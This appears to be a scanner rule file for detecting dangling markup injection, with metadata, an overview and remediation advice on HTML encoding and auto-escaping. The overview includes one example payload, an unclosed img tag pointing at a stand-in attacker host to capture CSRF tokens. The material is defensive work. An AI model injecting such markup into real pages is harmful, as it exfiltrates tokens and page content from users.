---
name: Dangling Markup Injection
version: 1.0.0
description: Detects HTML injection that, even without script execution, can exfiltrate page content via dangling attributes and tags.
tags: [web, dangling-markup, html-injection, owasp-a03]
languages: [javascript, typescript, php, python]
severity: medium
confidence: medium
cwe: [CWE-79]
owasp: [A03:2025]
---

# Dangling Markup Injection

## Overview
Dangling markup injection occurs when an attacker can inject partial HTML that does not need to execute scripts to exfiltrate data. For example, injecting `<img src="https://attacker.com/?` leaves an unclosed attribute that captures all subsequent HTML (including CSRF tokens) until the next quote character.

This bypasses CSP policies that block inline scripts.

## Remediation
- HTML-encode all user-provided content before inserting into HTML
- Use template auto-escaping (`{{ value }}` in Jinja2/Django)
- Avoid inserting user data into HTML attribute values without encoding
